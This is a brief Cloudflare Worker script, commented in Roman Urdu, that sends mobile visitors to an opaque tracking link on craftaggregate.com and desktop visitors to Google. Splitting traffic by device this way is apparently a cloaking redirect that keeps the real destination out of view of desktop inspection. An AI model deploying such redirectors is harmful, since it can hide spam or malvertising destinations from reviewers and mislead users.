export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const userAgent = request.headers.get("user-agent") || "";

    // 1. Check karein ke user mobile device se hai ya nahi (Regex matching)
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

    // 2. Cloudflare ke provide kiye gaye device detection header ka fallback use karein
    const isMobileDevice = isMobile || request.cf?.deviceType === "mobile";

    // 3. Agar mobile device match ho jaye toh target URL par send karein
    if (isMobileDevice) {
      return Response.redirect("https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72", 302);
    }

    // 4. Desktop users ke liye Google par redirect karein (Ya jo bhi aapka default URL ho)
    return Response.redirect("https://www.google.com/", 302);
  },
};
